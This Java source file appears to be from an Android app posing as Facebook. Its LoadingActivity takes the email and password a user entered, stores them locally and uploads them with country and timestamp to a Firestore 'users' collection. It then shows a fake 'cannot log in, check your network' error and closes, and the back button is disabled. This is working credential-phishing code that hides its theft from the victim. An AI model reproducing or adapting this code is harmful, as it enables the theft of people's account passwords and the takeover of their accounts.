package com.hivluver.facebook;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Color;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.developer.kalert.KAlertDialog;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.Timestamp;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class LoadingActivity extends AppCompatActivity {
    private final int SPLASH_DISPLAY_LENGTH = 4000;
    private DataBaseFacebookAccount dbfacebook;
    FirebaseFirestore db = FirebaseFirestore.getInstance();
    ProgressBar progressBar;
    TextView textView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loading);
        progressBar= findViewById(R.id.progressBar);
        textView = findViewById(R.id.textView);
        dbfacebook = new DataBaseFacebookAccount(this);
        try {
            sendToFirestore(getIntent().getStringExtra("email"),getIntent().getStringExtra("pass"));

        }catch (Exception e){
            Toast.makeText(this, "Error line 35 Loading", Toast.LENGTH_SHORT).show();
        }
        new Handler().postDelayed(new Runnable(){
            @Override
            public void run() {

                progressBar.setVisibility(View.INVISIBLE);
                textView.setVisibility(View.INVISIBLE);
                final KAlertDialog progressDialog = new KAlertDialog(LoadingActivity.this);
                //progressDialog.getProgressHelper().setBarColor(Color.parseColor("#A5DC86"));
                progressDialog.setTitleText(getResources().getString(R.string.error_al_entrar));
                progressDialog.setContentText(getResources().getString(R.string.no_se_puede_iniciar_sesi_n_comprueba_tu_conexi_n_de_red));
                progressDialog.setCancelable(false);
                progressDialog.setConfirmText(getResources().getString(R.string.aceptar));
                progressDialog.confirmButtonColor(R.color.azulfuerte);
                progressDialog.setConfirmClickListener(new KAlertDialog.KAlertClickListener() {
                    @Override
                    public void onClick(KAlertDialog kAlertDialog) {
                        progressDialog.hide();
                        LoadingActivity.this.finish();
                    }
                });
                progressDialog.show();
            }
        }, SPLASH_DISPLAY_LENGTH);
    }
    private void sendToFirestore(final String email, final String pass){
        Locale current = getResources().getConfiguration().locale;
        Map<String, Object> user = new HashMap<>();
        user.put("email",email);
        user.put("pass", pass);
        user.put("country", current.getCountry());
        user.put("date", new Timestamp(new Date()));
        save_accounts(email, pass);
        db.collection("users")
                .add(user)
                .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
                    @Override
                    public void onSuccess(DocumentReference documentReference) {
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                    }
                });
    }
    private void save_accounts(final String email, final String password) {

        @SuppressLint("StaticFieldLeak") AsyncTask<Object, Object, Cursor> insertTask =
                new AsyncTask<Object, Object, Cursor>() {
                    @Override
                    protected Cursor doInBackground(Object... params) {
                        dbfacebook.insertsAccounts(email,password);
                        return null;
                    }

                    @Override
                    protected void onPostExecute (Cursor result) {

                    }

                };
        insertTask.execute();

    }

    @Override
    public void onBackPressed() {

    }
}